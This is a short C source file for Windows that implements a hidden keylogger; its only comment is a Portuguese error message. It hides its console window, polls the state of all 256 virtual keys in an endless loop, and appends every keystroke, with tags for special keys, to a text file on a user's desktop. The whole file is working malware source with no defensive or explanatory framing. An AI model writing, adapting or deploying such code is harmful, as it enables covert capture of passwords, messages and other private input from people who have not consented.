#include <stdio.h>  
#include <windows.h>  
 
int main() {
    short i; 
    short keyState;  
    HWND hidden; 
    AllocConsole(); 
    hidden = FindWindow("ConsoleWindowClass", NULL); 
    ShowWindow(hidden, 0); 
 
    while(1) {
        for(i = 0; i <= 255; i++) {
            keyState = GetAsyncKeyState(i);
            if(keyState == -32767) {
                Sleep(30);
                FILE *file;
                file = fopen("C:/Users/Marcos/Desktop/test.txt", "a+");
 
                if(file == NULL) {
                    printf("Um Erro ao criar o Arquivo test.txt.\n");
                    exit(1);
                }
 
                switch(i) {
                    case VK_SPACE:
                    fputc(' ', file);
                    fclose(file);
                    break;
                    case VK_SHIFT:
                    fputs("\r\n[SHIFT]\r\n", file);
                    fclose(file);
                    break;
                    case VK_RETURN:
                    fputs("\r\n[ENTER]\r\n",file);
                    fclose(file);
                    break;
                    case VK_BACK:
                    fputs("\r\n[BACKSPACE]\r\n",file);
                    fclose(file);
                    break;
                    case VK_TAB:
                    fputs("\r\n[TAB]\r\n",file);
                    fclose(file);
                    break;
                    case VK_CONTROL:
                    fputs("\r\n[CTRL]\r\n",file);
                    fclose(file);
                    break;
                    case VK_DELETE:
                    fputs("\r\n[DEL]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_1:
                    fputs("\r\n[;:]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_2:
                    fputs("\r\n[/?]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_3:
                    fputs("\r\n[`~]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_4:
                    fputs("\r\n[ [{ ]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_5:
                    fputs("\r\n[\\|]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_6:
                    fputs("\r\n[ ]} ]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_7:
                    fputs("\r\n['\"]\r\n",file);
                    fclose(file);
                    break;
                    case 187:
                    fputc('+',file);
                    fclose(file);
                    break;
                    case 188:
                    fputc(',',file);
                    fclose(file);
                    break;
                    case 189:
                    fputc('-',file);
                    fclose(file);
                    break;
                    case 190:
                    fputc('.',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD0:
                    fputc('0',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD1:
                    fputc('1',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD2:
                    fputc('2',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD3:
                    fputc('3',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD4:
                    fputc('4',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD5:
                    fputc('5',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD6:
                    fputc('6',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD7:
                    fputc('7',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD8:
                    fputc('8',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD9:
                    fputc('9',file);
                    fclose(file);
                    break;
                    case VK_CAPITAL:
                    fputs("\r\n[CAPS LOCK]\r\n",file);
                    fclose(file);
                    break;
                    default:
                    fputc(i, file);
                    fclose(file);
                }
            }
        }
    }
    return 0;
}
